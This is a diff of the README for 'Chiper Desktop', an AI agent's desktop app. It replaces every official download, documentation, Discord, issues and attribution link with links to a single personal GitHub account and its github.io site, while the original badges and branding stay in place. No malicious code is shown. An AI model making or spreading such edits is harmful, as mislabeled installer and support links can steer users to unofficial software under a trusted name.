@@ -1,13 +1,13 @@
 # Chiper Desktop ☤
 
 <p align="center">
-  <a href="https://github.com/Chiper/chiper-agent/releases"><img src="https://img.shields.io/badge/Download-macOS%20%C2%B7%20Windows%20%C2%B7%20Linux-FFD700?style=for-the-badge" alt="Download"></a>
-  <a href="https://chiper-agent.Chiper.com/docs/"><img src="https://img.shields.io/badge/Docs-chiper--agent.Chiper.com-FFD700?style=for-the-badge" alt="Documentation"></a>
-  <a href="https://discord.gg/Chiper"><img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord"></a>
-  <a href="https://github.com/Chiper/chiper-agent/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License: MIT"></a>
+  <a href="https://github.com/iamtubasya/chiper-agent.git/releases"><img src="https://img.shields.io/badge/Download-macOS%20%C2%B7%20Windows%20%C2%B7%20Linux-FFD700?style=for-the-badge" alt="Download"></a>
+  <a href="https://iamtubasya.github.io/chiper-agent/docs/"><img src="https://img.shields.io/badge/Docs-chiper--agent.Chiper.com-FFD700?style=for-the-badge" alt="Documentation"></a>
+  <a href="https://github.com/iamtubasya/chiper-agent"><img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord"></a>
+  <a href="https://github.com/iamtubasya/chiper-agent.git/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License: MIT"></a>
 </p>
 
-**The native desktop app for [Chiper Agent](../../README.md) — the self-improving AI agent from [Chiper](https://Chiper.com).** Same agent, same skills, same memory as the CLI and gateway, in a polished native window — chat with streaming tool output, side-by-side previews, a file browser, voice, and settings, no terminal required. Available for **macOS, Windows, and Linux**.
+**The native desktop app for [Chiper Agent](../../README.md) — the self-improving AI agent from [Chiper](https://github.com/iamtubasya/chiper-agent).** Same agent, same skills, same memory as the CLI and gateway, in a polished native window — chat with streaming tool output, side-by-side previews, a file browser, voice, and settings, no terminal required. Available for **macOS, Windows, and Linux**.
 
 <table>
 <tr><td><b>Chat with the full agent</b></td><td>Streaming responses, live tool activity, structured tool summaries, and the same conversation history as every other Chiper surface.</td></tr>
@@ -34,7 +34,7 @@ It builds and launches the GUI against your existing install — same config, ke
 
 ### Prebuilt installers
 
-Prebuilt installers are built and distributed via [the Chiper Desktop website.](https://chiper-agent.Chiper.com/).
+Prebuilt installers are built and distributed via [the Chiper Desktop website.](https://iamtubasya.github.io/chiper-agent/).
 
 ---
 
@@ -128,9 +128,9 @@ Remove-Item -Recurse -Force "$env:LOCALAPPDATA\chiper\chiper-agent\venv"
 
 ## Community
 
-- 💬 [Discord](https://discord.gg/Chiper)
-- 📖 [Documentation](https://chiper-agent.Chiper.com/docs/)
-- 🐛 [Issues](https://github.com/Chiper/chiper-agent/issues)
+- 💬 [Discord](https://github.com/iamtubasya/chiper-agent)
+- 📖 [Documentation](https://iamtubasya.github.io/chiper-agent/docs/)
+- 🐛 [Issues](https://github.com/iamtubasya/chiper-agent.git/issues)
 
 ---
 
@@ -138,4 +138,4 @@ Remove-Item -Recurse -Force "$env:LOCALAPPDATA\chiper\chiper-agent\venv"
 
 MIT — see [LICENSE](../../LICENSE).
 
-Built by [Chiper](https://Chiper.com).
+Built by [Chiper](https://github.com/iamtubasya/chiper-agent).
